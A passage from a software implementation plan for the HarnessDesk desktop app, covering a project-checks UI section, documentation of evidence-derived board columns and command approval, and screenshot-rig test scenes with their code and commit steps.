            desc={<CodeText>{check.run}</CodeText>}
            control={<RowValue>{seenWords(check.seen)}</RowValue>}
          />
        ))}
        {checks.problems.map((problem) => (
          <Row
            key={`${problem.at}:${problem.text}`}
            title={problem.at === '' ? 'The file' : problem.at}
            desc={problem.text}
            control={<Chip state="broken" label="Not offered" />}
          />
        ))}
      </Rows>
    </section>
  )
}
```

In `packages/ui/src/components/ProjectPage.tsx`, add `import { ProjectChecks } from './ProjectChecks'`, and directly after the Agents section's closing `</section>` add:

```tsx

      {/* Its named checks, once it has a checks file: the commands a card can
          run, verbatim, and whether this Mac has approved each as it is now. */}
      <ProjectChecks root={root} />
```

- [ ] **Step 6: The preview**

1. In `packages/ui/src/preview/harness.tsx`, add `type ProjectChecks,` to the import from `@harnessdesk/protocol` and `PREVIEW_CHECKS` to the import from `./evidence-fixture`, and after `seatRecord = …` add:

```tsx
  projectChecks = async (): Promise<ProjectChecks> => PREVIEW_CHECKS
```

2. In `packages/ui/src/preview/main.tsx`, add `import { ProjectChecks } from '../components/ProjectChecks'` and `import { PREVIEW_ROOT } from './sidebar-fixture'`, and after the Agents side panel's frame add:

```tsx
        {/* A project's checks, as its page lists them. */}
        <Frame title="Project — its checks">
          <div className="p-4">
            <ProjectChecks root={PREVIEW_ROOT} />
          </div>
        </Frame>
```

   Phase 2's *Workspaces › a project* frame shows the same section in place, under the page's Agents.

- [ ] **Step 7: Run the tests to see them pass**

Run: `pnpm --filter @harnessdesk/ui exec vitest run src/components/ProjectChecks.test.tsx src/state/store.evidence.test.ts src/components/ProjectPage.test.tsx && node script/check-reachable.mjs`
Expected: PASS — 5, 7, and every test in `ProjectPage.test.tsx`; then the gate's one line, `… host methods reachable from a surface; … pinned as not.`, with no `evidence/` verb left in `UNREACHED`.

- [ ] **Step 8: Prove the tests can fail, and look at it**

1. In `ProjectChecks`, replace `return read.checks.exists ? <ProjectChecksView checks={read.checks} /> : null` with `return <ProjectChecksView checks={read.checks} />`: `a project with no checks file shows no section at all` fails, and so does the page's appended test. Restore it.
2. In `ProjectChecksView`, map over nothing instead of `checks.problems`: `a check the file refuses is listed with where and why, never hidden` fails. Restore it.
3. Drop the `checks.uncommitted &&` note: `a working copy that is not what is committed is said, and what is listed is still the committed file` fails. Restore it.

Run the preview: *Project — its checks* lists `pnpm verify`, `pnpm lint --max-warnings 0` and `pnpm typecheck` with their approval words, as committed at `a1b2c3d`, and `e2e.run` with *Not offered*. Then:

```bash
node script/design-audit.mjs --strict
pnpm test:ui-system
```

Expected: the audit's findings unchanged; every UI-system spec passing.

- [ ] **Step 9: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/ui/src/components/ProjectChecks.tsx packages/ui/src/components/ProjectChecks.test.tsx packages/ui/src/components/ProjectPage.tsx packages/ui/src/components/ProjectPage.test.tsx packages/ui/src/state/store.ts packages/ui/src/state/store.evidence.test.ts packages/ui/src/preview/harness.tsx packages/ui/src/preview/main.tsx script/check-reachable.mjs
git commit -m "feat(evidence): a project's page lists its checks

Each named check with its command verbatim, as committed, and whether this
Mac has approved it for this version of the file; the file they are read
from and the commit they were read at; a note when the working copy is not
what is committed, which is not what runs; and each check the file refuses
with where and why. The section appears only once the project has a checks
file. ProjectPage.test.tsx's store gains projectChecks.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 22: The documentation

Every surface this phase adds is written where a reader of the shipped docs will look for it: the board's columns and a card's evidence in `docs/multi-agent.md`, the Seat record and a project's checks in `docs/interface.md`, and what the desk now keeps on disk — and what it reads from the forge — in `docs/data-boundaries.md`. The paths are written so the doc-path gate can resolve them: `lib/board-facts.ts` from inside the package, and a project's own files — its `checks.yml`, in its `.harnessdesk` folder — without a slash, because they are in the reader's project and not this tree.

**Files:**
- Modify: `docs/multi-agent.md` (*Board columns and card interactions* rewritten; *Evidence on a card* added)
- Modify: `docs/interface.md` (*What the desk observed* added before *Out-of-band messages*)
- Modify: `docs/data-boundaries.md` (*Local* says what the desk keeps and reads)

**Proof needs:** neither

**Interfaces:**
- Consumes: every surface of Tasks 15–21; `script/check-doc-paths.mjs`.
- Produces: prose.

- [ ] **Step 1: The board, in `docs/multi-agent.md`**

Replace the body of *Board columns and card interactions* — from "The board uses five fixed columns that wrap to fit the room width:" through the paragraph that ends "preventing confusion before the drop occurs." — with:

```markdown
The board's columns are what is known about each card, not places a card is
put. A card sits where its state and what the desk observed on it put it
(`lib/board-facts.ts`):

| Column | Contents |
| --- | --- |
| To do | Work nobody has started: open, or waiting on unfinished dependencies — it starts itself when they land. |
| Working | Work its holder is on. |
| Needs you | Work that cannot move without a person: stopped by hand, a stranded claim, a holder waiting on your answer, a flow step addressed to you — or finished work whose facts are not good: a check or CI that failed, CI that was cancelled, a closed pull request, a fact gone stale or one nobody can place, or nothing checked at all. The card says which — *verify out of date*, *CI unknown*, *PR #12 out of date*. |
| In review | Finished work whose evidence is still arriving: a check running, CI running, a pull request open. |
| Ready | Finished work a current fact says is good: a fresh passing check, fresh passing CI, or a merged pull request — fresh, or final once its branch is gone after the merge. Nothing else: not a pass gone stale, not a fact restored from a backup. |
| Set aside | Work a person abandoned. Settled, never good news, and never *Ready* whatever was observed on it; the column is drawn only while it holds something. |

A column moves on a check, a diff, a pull request or CI — never on anybody
saying the work is done. A message in the channel, a finish note or an outcome
that says the tests pass moves nothing: a card finished that way, with nothing
observed, waits in *Needs you* and says *nothing checked*. A stranded claim is
in *Needs you* too, because somebody has to take it over.

Nothing is dragged, and no column takes a title: there is no column to put a
card in, only the one its facts put it in, and work goes on through *New job*.
An empty column says *Nothing here*. Every verb is in the card's ⋮ menu —
*Mark done*, *Take it back off …*, *Put back in play*, *Stop it — say why*,
*Abandon* — and, when the project names checks, *Run <check>* for each. A
check that cannot run now stays in the menu, greyed, and says why: the file
refuses it, or another check is running on that card, since one runs on a
card at a time.
```

Then, directly before *Claiming work and file safety*, add:

```markdown
### Evidence on a card

The desk records what it observed, never what an agent said: a named check it
ran, the branch's diff, and its pull request with the forge's checks on that
pull request's head — each bound to the commit it was true at, and kept under
`~/.harnessdesk/evidence/`, one append-only store per project, never in the
repository. A card carries its facts as chips — *verify ✓ @a1b2c3d*, *CI ✓*,
*PR #12 open*, *+120 −30 in 6 files* — and a fact no longer about its
branch's head says how far behind it is (*verify ✓ @a1b2c3d — 2 commits
since*), struck through and never green; one the desk cannot place is drawn
neutral, and its dialog says why. The chips open *What the desk observed*:
when, at which commit, by which Seat, and how each stands now.

Staleness is read, not watched: the board reads its evidence when it is shown,
when the window comes back to the front, and every thirty seconds while it is
on screen. The diff, pull request and CI are looked at when a card is finished
and, at most every five minutes a card, when a board is read.

A project names its checks in `checks.yml` in its `.harnessdesk` folder —
`verify: { run: pnpm verify, timeout: 1200 }` — and every card offers *Run
verify*. What runs is the file as committed: a change in your working copy
runs nothing until it is committed, and the project's page says when the two
differ. That file is committed in a repository someone may have cloned, so a
command runs only after a person has approved it, verbatim, on this Mac: the
first run shows the command, where it runs and the file it came from, says
that it runs with your full authority, as it would in your terminal, and runs
it only when you press *Run*. Any change to the file asks again — a changed,
renamed, added or re-added command, even a new comment — and so does another
repository cloned at the same path. An approved check can read and change
anything you can and use the network: the desk does not sandbox it; it only
keeps its own variables and tokens out of the check's environment. What you
approved is kept in `commands-seen.json` in the desk's own folder, signed with
a key only this Mac can read, and travels in no backup. A check the file
refuses — a command that is not plain printable ASCII, a key other than `run`
and `timeout` — stays in the card's menu, greyed, and the project's page says
why. A flow's check step is recorded the same way, in its round.

A backup carries what the desk observed, and a restore adds it as history:
marked as restored, drawn as unknown until this desk observes the same
question itself, never able to put a card in *Ready*, and never able to close,
replace or stand in for a Seat this desk kept.
```

- [ ] **Step 2: The surfaces, in `docs/interface.md`**

Directly before `## Out-of-band messages`, add:

```markdown
## What the desk observed

**On a card.** A room's board draws each card's evidence as chips in its foot,
and its columns — To do, Working, Needs you, In review, Ready, and Set aside
while anything is — come from those facts, so nothing on the board is dragged. The whole of it is in
[multi-agent.md](multi-agent.md), under *The Board*.

**A conversation's Seat record.** A conversation seated as an Agent shows its
Seat record at the head of its Agents inspector, above the sub-agents it
started: the Agent and where it came from, what it runs on, what was passed
over on the way, what its standing order told it it may do, the checkout it
started in, its board, and when it opened and closed. A Seat restored from a
backup says so. It is read-only, because
the record is: written once when the seat was kept, and closed once. A
conversation never seated shows none of it.

**A project's checks.** Workspaces › a project lists the checks the project
names, as committed, each command verbatim with whether this Mac has approved
it for this version of the file, says when your working copy of the file is
not what is committed, and lists every check the file refuses with where and
why. The section appears only once the project has a checks file.
```

- [ ] **Step 3: What stays local, in `docs/data-boundaries.md`**

Replace the first paragraph of *Local — the default, and today the only one* with:

```markdown
Nothing leaves. Agent credentials, API keys, vendor sessions, source, terminal
output, diffs, transcripts, browser state, the audit log, and what the desk
observed — every Seat it kept and every fact it recorded — are files on your
disk, under `~/.harnessdesk` and your own repositories. The host binds a
loopback socket the renderer talks to; nothing listens on a routable address.
To see a card's pull request and its CI, the desk asks your forge with your
own `gh`, in the card's checkout — the same tool, and the same account, the
desk already publishes with.
```

- [ ] **Step 4: Check it**

Run: `node script/check-doc-paths.mjs && node script/check-claims.mjs`
Expected: both pass — every backticked path resolves, and no recorded claim names text this task removed.

- [ ] **Step 5: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add docs/multi-agent.md docs/interface.md docs/data-boundaries.md
git commit -m "docs(evidence): the board's facts, the Seat record and a project's checks

multi-agent.md: columns that come from the facts — Ready only on a current
fact, work set aside apart — nothing dragged, and a card's evidence: what the
desk records, how it goes stale, what a backup brings, and the first run of a
check's command, which runs as committed with your full authority. interface.md: where each surface is. data-boundaries.md:
what the desk now keeps on disk, and that it reads a pull request with your
own gh.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 23: Verified in the real app, one picture per surface

> **Runs a `.harnessdesk/checks.yml` command, in the real app, through the question a person answers** — the staged storefront's own `verify`, `node --test`, on a test file the rig writes. Its scenes fail the take if anything ran before the question was answered, if the question does not say the check runs with your full authority, and if a command already approved asks again; that a changed, added or renamed command asks again is pinned in Tasks 8, 11 and 17. Nothing reads through to a real account: the rig's audit refuses any frame it cannot vouch for, and this task never loosens it.

The roadmap's *Done when*, in the app: a card's *verify ✓* goes stale when a commit lands on its branch and fresh again when the check runs again; and a conversation's Seat record is still there after a restart. The screenshot rig (`script/shots/`, extended by phase 2's Task 22) stages the desk and drives the real Electron app over CDP; this task gives the storefront a check, adds a scene per surface, and has each scene fail the take when the app says anything other than what the scene is for. The frames go to a scratch folder and are read, every one, before the commit; none is committed.

| Scene | Surface | Proves |
| --- | --- | --- |
| `evidence-ask` | *Run verify*, the first time | the question shows `node --test` verbatim, and nothing has run |
| `evidence-fresh` | The board, after the answer | *verify ✓ @…* on card #1, in *Ready* |
| `evidence-observed` | *What the desk observed* | the fact whole: when, at which commit, *Fresh* |
| `evidence-stale` | The board, after a commit lands on main | *verify out of date* and *— 1 commit since*, in *Needs you* |
| `evidence-refreshed` | The board, after *Run verify* again | no question this time, and *verify ✓* fresh, back in *Ready* |
| `seat-record` | The Agents inspector | *Code reviewer · In storefront*, *Read · asked* |
| `project-checks` | Workspaces › storefront | `node --test`, *Approved on this Mac* |
| `seat-record-restarted` | The Agents inspector, after the app quit and opened again | the same Seat record, read back from disk |

**Files:**
- Modify: `script/shots/seed.mjs` (the storefront's check, committed; what a take leaves is cleared)
- Modify: `script/shots/shoot.mjs` (eight scenes)
- Test: `script/shots-isolation.test.mjs` (one test appended)

**Proof needs:** the rendered UI — the real app, launched on the rig's isolated home. A writer whose sandbox denies launching the app leaves the take to the controller and says so.

**Interfaces:**
- Consumes: every surface of Tasks 15–21; phase 2's Task 22 rig — `openStorefront`, `click`, `STORE`, `q`, `sleep`, `splitKey`, `makeRoom`, `waitForSnapshot`, `HOME`, `REPO`; `store.startAsAgent` (phase 2's Task 14); `store.openDetailsTab`; `readChecks` (`packages/server/dist/src/evidence/checks-file.js`) in the gate test.
- Produces: eight scenes, and their frames in a scratch folder — never committed.

- [ ] **Step 1: Write the failing gate test**

In `script/shots-isolation.test.mjs`, add `existsSync, mkdirSync, writeFileSync` to the `node:fs` import, import `readChecks` from `'../packages/server/dist/src/evidence/checks-file.js'`, and append:

```js
test('the storefront names one check and commits it, and every take starts with nothing approved and nothing observed', async t => {
  const directory = mkdtempSync(join(tmpdir(), 'hd-shots-evidence-'))
  t.after(() => rmSync(directory, { recursive: true, force: true }))
  const home = join(directory, 'home')
  const work = join(directory, 'work')
  const seed = () =>
    execFileSync(process.execPath, [join(root, 'script/shots/seed.mjs')], {
      env: { ...process.env, HD_SHOTS_HOME: home, HD_SHOTS_WORK: work, HD_SHOTS_NATIVE_CODEX: '0' },
      stdio: 'pipe',
    })
  seed()
  const storefront = join(work, 'storefront')
  const read = await readChecks(storefront)
  assert.deepEqual(read.problems, [])
  assert.deepEqual(read.checks, [{ name: 'verify', run: 'node --test', timeout: 120 }])
  // Committed: a check that ran on uncommitted files would be about no commit at all.
  assert.equal(execFileSync('git', ['-C', storefront, 'status', '--porcelain'], { encoding: 'utf8' }), '')
  // And the command it runs passes, so the frames show a pass.
  execFileSync(process.execPath, ['--test'], { cwd: storefront, stdio: 'pipe' })

  // A take leaves what it saw and observed behind; the next seed clears both.
  mkdirSync(join(home, 'evidence'), { recursive: true })
  writeFileSync(join(home, 'commands-seen.json'), '{}\n')
  writeFileSync(join(home, 'commands-seen.key'), 'key\n')
  writeFileSync(join(home, 'seat-record-scene.json'), '{}\n')
  seed()
  for (const name of ['evidence', 'commands-seen.json', 'commands-seen.key', 'seat-record-scene.json']) {
    assert.equal(existsSync(join(home, name)), false, `${name} survived a seed`)
  }
})
```

- [ ] **Step 2: Run it to see it fail**

Run: `pnpm run build:node && node --test --test-reporter=spec script/shots-isolation.test.mjs`
Expected: FAIL — `the storefront names one check…`: `read.checks` is `[]` — the seed writes no checks file.

- [ ] **Step 3: The storefront's check**

In `script/shots/seed.mjs`:

1. Add `'evidence'`, `'commands-seen.json'`, `'commands-seen.key'` and `'seat-record-scene.json'` to `RESIDUE`: every take starts with nothing observed and no command approved, so the first run's question is on camera.
2. After the line that builds `roots` and says `repositories: …`, add:

```js
// ------------------------------------------------------------------ the check
/**
 * The storefront names one check, `verify`, and commits it with the test it
 * runs — so a card's *Run verify* has a real command to show and to run, and
 * what it records is bound to a commit rather than to uncommitted files. A
 * real test, that passes: the evidence scenes photograph it fresh, stale
 * after a commit lands, and fresh again when it runs once more. Written once;
 * a repository that already has it is left as it is.
 */
if (!existsSync(join(roots.storefront, '.harnessdesk', 'checks.yml'))) {
  mkdirSync(join(roots.storefront, '.harnessdesk'), { recursive: true })
  mkdirSync(join(roots.storefront, 'test'), { recursive: true })
  writeFileSync(join(roots.storefront, '.harnessdesk', 'checks.yml'), 'verify: { run: node --test, timeout: 120 }\n')
  writeFileSync(
    join(roots.storefront, 'test', 'retry.test.mjs'),
    "import assert from 'node:assert/strict'\nimport { test } from 'node:test'\n\ntest('a 502 is retried', () => {\n  assert.ok([502, 503, 504].includes(502))\n})\n",
  )
  const git = (...args) => execFileSync('git', args, { cwd: roots.storefront, stdio: 'pipe' })
  git('add', '-A')
  git('commit', '-m', 'Name the verify check')
}
say('checks: storefront names verify (node --test)')
```

- [ ] **Step 4: The scenes**

In `script/shots/shoot.mjs`, add `import { execFileSync } from 'node:child_process'` as the first import and `writeFileSync` to the `node:fs` import if it is not there, and just before the line that reads `--scene` arguments (`const named = argv.flatMap(…)`), add:

```js
  /* ---------------------------------------------------------- evidence */

  /**
   * A real check on a real card. The storefront names `verify` (seed.mjs); a
   * card is finished; its *Run verify* runs `node --test` in the storefront —
   * the first time through the question a person answers, which the take
   * answers the way they would. What it records is a fact at the storefront's
   * head. A commit landing on main makes it stale, and running it again makes
   * it fresh: the phase's *Done when*, a frame each, and each failing the take
   * when the app says anything else.
   */
  let evidenceRoom = null
  const stageEvidence = async () => {
    if (evidenceRoom) return evidenceRoom
    await cdp.eval(`${STORE}.openWorkspace(${q(REPO)})`, 120_000)
    evidenceRoom = await makeRoom(cdp, { work: REPO, name: 'Release checks', members: [] })
    await cdp.eval(`${STORE}.teamAdd(${q(evidenceRoom)}, { title: 'Retry the checkout call on a 502' })`, 60_000)
    await cdp.eval(`${STORE}.teamIntent(${q(evidenceRoom)}, 1, 'done')`, 60_000)
    await cdp.eval(`${STORE}.openTeamBoard(${q(evidenceRoom)}); true`)
    await sleep(1500)
    return evidenceRoom
  }

  /**
   * A real press — pointer down and up at the middle of what the selector
   * names — for a control that opens on the pointer rather than on a synthetic
   * click, as a menu's trigger does.
   */
  const press = async (selector) => {
    const point = await cdp.json(`(() => {
      const node = document.querySelector(${q(selector)})
      if (!node) throw new Error('nothing to press: ' + ${q(selector)})
      const rect = node.getBoundingClientRect()
      return { x: rect.left + rect.width / 2, y: rect.top + rect.height / 2 }
    })()`)
    for (const type of ['mousePressed', 'mouseReleased']) {
      await cdp.send('Input.dispatchMouseEvent', { type, ...point, button: 'left', clickCount: 1 })
    }
    await sleep(600)
  }

  /** Card #1's menu, and its *Run verify*. */
  const runVerify = async () => {
    await press('button[aria-label="What to do with #1"]')
    if (!(await click('Run verify', '[role="menu"]'))) throw new Error('card #1 offers no Run verify')
  }

  /** The words card #1 wears, and the column it sits in. */
  const cardOne = () =>
    cdp.json(`(() => {
      const card = [...document.querySelectorAll('[data-slot="board-card"]')]
        .find((one) => (one.textContent ?? '').includes('Retry the checkout call on a 502'))
      return {
        text: card?.textContent ?? '',
        column: card?.closest('[data-slot="board-column"]')?.querySelector('h3')?.textContent ?? null,
      }
    })()`)

  /** Waits — up to a minute, since a check runs a real command — for card #1 to say what it should. */
  const cardSays = (matches) => waitForSnapshot(cardOne, matches, { attempts: 600 })

  SCENES['evidence-ask'] = {
    leaveOverlay: true,
    expect: 'Run verify on this Mac for the first time?',
    run: async () => {
      await stageEvidence()
      await runVerify()
    },
    verify: async () => {
      const shown = await cdp.eval(`document.querySelector('[role="alertdialog"] pre')?.textContent ?? ''`)
      if (shown !== 'node --test') throw new Error(`the question shows ${q(shown)}, not the command verbatim`)
      const said = await cdp.eval(`document.querySelector('[role="alertdialog"]')?.textContent ?? ''`)
      if (!said.includes('It runs with your full authority, as it would in your terminal')) {
        throw new Error('the question does not say what running it means')
      }
      if ((await cardOne()).text.includes('verify ✓')) throw new Error('verify ran before anyone answered')
    },
  }

  /** The question's answer, once it is armed: it is disabled for a moment after the question opens (`ARM_MS`). */
  const armed = () =>
    waitForSnapshot(
      () =>
        cdp.eval(
          `[...document.querySelectorAll('[role="alertdialog"] button')].some((one) => one.textContent?.trim() === 'Run verify' && !one.disabled)`,
        ),
      Boolean,
      { attempts: 50 },
    )

  SCENES['evidence-fresh'] = {
    expect: 'verify ✓ @',
    run: async () => {
      await armed()
      if (!(await click('Run verify', '[role="alertdialog"]'))) throw new Error('the question has no Run verify')
      await cardSays((card) => card.column === 'Ready' && /verify ✓ @[0-9a-f]{7}/.test(card.text) && !card.text.includes('since'))
    },
  }

  SCENES['evidence-observed'] = {
    expect: 'What the desk observed on #1',
    run: async () => {
      await press('button[aria-label^="What the desk observed on #1"]')
    },
    verify: async () => {
      const text = await cdp.eval(`document.querySelector('[role="dialog"]')?.textContent ?? ''`)
      for (const words of ['Fresh: nothing has landed on its branch since.', 'node --test', 'It exited 0.']) {
        if (!text.includes(words)) throw new Error(`the dialog does not say ${q(words)}`)
      }
    },
  }

  SCENES['evidence-stale'] = {
    expect: '1 commit since',
    run: async () => {
      await cdp.send('Input.dispatchKeyEvent', { type: 'keyDown', key: 'Escape', code: 'Escape', windowsVirtualKeyCode: 27 })
      await cdp.send('Input.dispatchKeyEvent', { type: 'keyUp', key: 'Escape', code: 'Escape', windowsVirtualKeyCode: 27 })
      execFileSync('git', ['-C', REPO, 'commit', '--allow-empty', '-q', '-m', 'Log the retry count'], { stdio: 'pipe' })
      // What the board does when the window comes back to the front: read again.
      await cdp.eval(`${STORE}.loadBoardEvidence(${q(evidenceRoom)})`, 60_000)
      await cardSays((card) => card.column === 'Needs you' && card.text.includes('verify out of date') && card.text.includes('1 commit since'))
    },
  }

  SCENES['evidence-refreshed'] = {
    expect: 'verify ✓ @',
    run: async () => {
      await runVerify()
      await sleep(400)
      if (await cdp.eval(`Boolean(document.querySelector('[role="alertdialog"]'))`)) {
        throw new Error('a command this Mac has approved asked again')
      }
      await cardSays((card) => card.column === 'Ready' && !card.text.includes('since'))
    },
  }

  /** The Seat record on screen names the Agent, where it came from, and what it was told. */
  const seatRecordSays = async () => {
    const text = await cdp.eval(`document.querySelector('[aria-label="Seat record"]')?.textContent ?? ''`)
    for (const words of ['Code reviewer', 'In storefront', 'Read · asked']) {
      if (!text.includes(words)) throw new Error(`the Seat record does not say ${q(words)}: ${q(text)}`)
    }
  }

  SCENES['seat-record'] = {
    leaveOverlay: true,
    expect: 'Seat record',
    run: async () => {
      await openStorefront()
      const key = await cdp.eval(`${STORE}.startAsAgent('code-reviewer')`, 180_000)
      if (!key) throw new Error('Code reviewer was not seated')
      // For the take after a restart, which opens this same conversation again.
      writeFileSync(join(HOME, 'seat-record-scene.json'), `${JSON.stringify({ key })}\n`)
      await cdp.eval(`${STORE}.openDetailsTab('agents'); true`)
      await sleep(2500)
    },
    verify: seatRecordSays,
  }

  SCENES['project-checks'] = {
    leaveOverlay: true,
    expect: 'node --test',
    run: async () => {
      await cdp.eval(`${STORE}.askSettings('workspaces', ${q(REPO)}); true`)
      await sleep(1500)
    },
    verify: async () => {
      const text = await cdp.eval(`document.querySelector('section[aria-label="Checks"]')?.textContent ?? ''`)
      if (!text.includes('Approved on this Mac')) throw new Error(`the project's checks do not say verify was approved here: ${q(text)}`)
    },
  }

  /**
   * The same Seat record after the app quit and opened again: a take of its
   * own, after the one with `seat-record`, with no seed in between. The record
   * is read back from the store on disk, and the conversation still wears its
   * Agent.
   */
  SCENES['seat-record-restarted'] = {
    leaveOverlay: true,
    expect: 'Seat record',
    run: async () => {
      const { key } = JSON.parse(readFileSync(join(HOME, 'seat-record-scene.json'), 'utf8'))
      const { runtime, sessionId } = splitKey(key)
      await openStorefront()
      const record = await cdp.json(`${STORE}.seatRecord(${q(runtime)}, ${q(sessionId)})`, 60_000)
      if (record?.agent?.id !== 'code-reviewer') throw new Error(`no Seat record for Code reviewer after the restart: ${q(record)}`)
      await cdp.eval(`${STORE}.openSession(${q(sessionId)}, { runtime: ${q(runtime)} })`, 120_000)
      await cdp.eval(`${STORE}.openDetailsTab('agents'); true`)
      await sleep(2500)
    },
    verify: seatRecordSays,
  }
```

- [ ] **Step 5: Run the gate to see it pass**

Run: `node --test --test-reporter=spec script/shots-isolation.test.mjs`
Expected: PASS — every test, the appended one included.

- [ ] **Step 6: Take the frames, in the real app**

```bash
cd "$(git rev-parse --show-toplevel)"
pnpm run build
node script/shots/seed.mjs
SHOTS="$(mktemp -d)"
node script/shots/shoot.mjs --out "$SHOTS" --scene evidence-ask --scene evidence-fresh --scene evidence-observed \
  --scene evidence-stale --scene evidence-refreshed --scene seat-record --scene project-checks
# The app has quit. Open it again, on the same home, without seeding:
node script/shots/shoot.mjs --out "$SHOTS" --scene seat-record-restarted
# And the board at a narrow window, from a fresh desk:
node script/shots/seed.mjs
node script/shots/shoot.mjs --out "$SHOTS/narrow" --width 700 --scene evidence-ask --scene evidence-fresh \
  --scene evidence-stale --scene evidence-refreshed
ls "$SHOTS" "$SHOTS/narrow"
```

Expected: a `-light` and a `-dark` frame per scene — twenty-four in all — and no scene stopped with its reason. A scene that stops names what the app said instead; fix the surface, never the scene's expectation.

- [ ] **Step 7: Read every frame**

Open each PNG and look: both themes, and the narrow board. The stale chip is struck through and not green; *Needs you* shows *verify out of date*; the question's command is `node --test` exactly, and it says the check runs with your full authority; an empty column says *Nothing here* and no column has a slot to add in; no path outside `~/work` and no account the rig did not author is on screen (the audit refused the take if there were). Attach the frames to the pull request; commit none of them.

- [ ] **Step 8: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add script/shots/seed.mjs script/shots/shoot.mjs script/shots-isolation.test.mjs
git commit -m "test(evidence): the phase's done, photographed in the real app

The staged storefront names verify and commits it with the test it runs. The
takes run it from a card through the first-run question, photograph it fresh
in Ready, stale in Needs you after a commit lands on main, and fresh again
when it runs once more; show a Seat record in the Agents inspector, again
after the app quit and opened; and a project's checks on its page. Every take
starts with nothing approved and nothing observed, and the question's answer
is pressed only once it is armed.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

## What the roadmap asks, and where

| The roadmap's phase 4 says | Task |
| --- | --- |
| The `Evidence` type and its store | 1, 2 |
| Staleness at a revision | 3, 10 — and *final*, only for a merged pull request whose branch is gone |
| The producers: check, diff, pr, ci | 11, 13 (check); 12 (diff, pr, ci) |
| The immutable Seat record — Agent, brief hash, seat, effective ceiling, checkout, session pointer, opened, closed — replacing the in-memory copy | 1 (and the seam), 4, 5, 6 |
| Board columns derived from facts — working, needs you, in review, ready — rather than dragged | 18, 19 — *Ready* only on a current fact; cancelled CI never passes; abandoned work is *Set aside*, never *Ready* |
| The store is `evidence`, never `ledger` | Every task (a Global Constraint) |
| `.harnessdesk/checks.yml`: named commands the desk may run outside a flow | 7 |
| A command runs only after a person has seen it on this machine; a changed command asks again | 7 (read as committed), 8 (bound to the file's generation and the repository), 11, 17 |
| The records live under `~/.harnessdesk/`, one store per project, append-only, never in the repository | 2 (durable appends, one reading rule, bounds) |
| A project's page lists its checks, each command verbatim and whether this machine has seen it | 8, 21 |
| General › Backup carries evidence and Seat records | 14 — as history, never over what this desk kept |
| A card carries its evidence as chips; a stale chip says how far behind it is and is never green | 15, 16 |
| A chip opens what was observed, when, at which revision and by which Seat | 16 |
| A card offers *Run <check>*; the first run of an unseen command shows it verbatim and asks | 11, 17 |
| A drag into a column the facts contradict is refused on the column, naming the fact | 19 — decided otherwise: the board is derived, so nothing is dragged, and a card in *Needs you* names the fact (*Decisions*) |
| A conversation's details show its Seat record, read-only | 20 |
| *Done when* — *verify ✓* stale on a commit, fresh on a re-run | 10 and 18 (tested), 19 (drawn), 23 (in the app) |
| *Done when* — a closed conversation's Seat record is still there after a restart | 6 (closed pane, and deleted conversation), 23 (in the app) |
| *Messaging* — a message is never evidence | 10, 12, 16, 18, 19 |
| *Needs* — records whatever phase 3 knows, if it has landed | 1 (`ceiling` and the `standing` union, the seam) |

## Deliberately not in this phase

- **`review`, `finding` and `spend` facts.** Typed now so no later record needs a new shape; produced by phases 6 and 7.
- **Ceilings.** `ceiling` is `null` on every record; phase 3 fills it and draws it (*The seam with phase 3*).
- **A ref observer.** Freshness is read on a board read, on focus and every thirty seconds; phase 9 watches refs.
- **Flows on `run.ts`.** A flow's check still runs through the flow engine's own runner, which keeps no output; phase 6 moves it.
- **Posting evidence to a pull request.** `posted` stays `null`; publishing what the desk observed is a later phase's, through the forge plane.
- **A *Needs you* row in the left menu.** The column is on the board; the app-wide list of what waits for a person is phases 5 and 6.
- **Pruning the store.** Records are append-only and kept; nothing here compacts or expires them.
- **Evidence in the transcript.** Facts are drawn on cards and in their dialog, not interleaved into a conversation.
- **Dragging.** The board is derived; nothing is dragged in this phase or planned to be. Nor is a title typed into a column: the derived board takes none.
- **An OS-enforced sandbox for checks.** An approved check runs with the person's full authority — their files, their network, their tools — as it would in their terminal, and the first-run question says so in those words (Task 17). The desk keeps its own secrets out of the check's environment (Task 9) and asks again whenever the file changes (Task 8), but it confines nothing. A strict sandbox — a writable checkout only, an isolated home, no network unless approved — breaks common checks: this repository's own `pnpm verify` binds loopback listeners, reads toolchains and caches outside the checkout, and writes under the temporary directory. A sandbox worth having needs per-check grants a person can read and approve, and that is a phase of its own (*Decisions this plan takes* › *An approved check runs with the person's full authority*).
- **Reaping after an abrupt end, and processes that leave the group.** A check's process group is stopped on a timeout and on a quit; a process that starts a session of its own is not, and a desk that is killed outright stops nothing. No live-run identity is kept across a restart, so a restarted desk does not know a check was running. Task 9 pins the limit so it is never mistaken for a promise (*Decisions this plan takes* › *Stopping a check stops its process group, and nothing wider*).
